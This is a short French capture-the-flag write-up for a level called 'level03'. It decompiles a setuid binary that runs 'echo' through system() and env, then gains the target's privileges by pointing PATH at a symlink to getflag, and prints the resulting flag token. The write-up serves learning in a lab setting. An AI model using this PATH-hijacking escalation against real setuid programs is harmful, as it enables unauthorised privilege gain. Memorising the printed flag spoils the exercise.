# Level 03

1) un simple `ls` montre un fichier binaire nomme `level03`. Quand on l'execute ca affiche un simple `Exploit me`

2) Grace a Ghidra nous pouvons facilement decompiler le binaire pour voir comment il fonctionne:

```C
int main(int argc,char **argv,char **envp)

{
  __gid_t __rgid;
  __uid_t __ruid;
  int iVar1;
  
                    /* Unresolved local var: gid_t gid@[DW_OP_breg4(ESP): +24]
                       Unresolved local var: uid_t uid@[DW_OP_breg4(ESP): +28] */
  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  iVar1 = system("/usr/bin/env echo Exploit me");
  return iVar1;
}
```

4) Le programme est assez basique, les seuls vrais lignes interresantes sont le call `system()` pour appeler echo et tout les changements de `gid` et de `uid`. Le `Exploit me` n'est pas affiche via un `printf()` mais via un `echo`, donc un programe externe. Je peux donc modifier la variable d'environement `PATH` pour que `/usr/bin/env echo` appelle `getflag`

```bash
ln -s /bin/getflag /tmp/echo
export PATH=/tmp 
./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
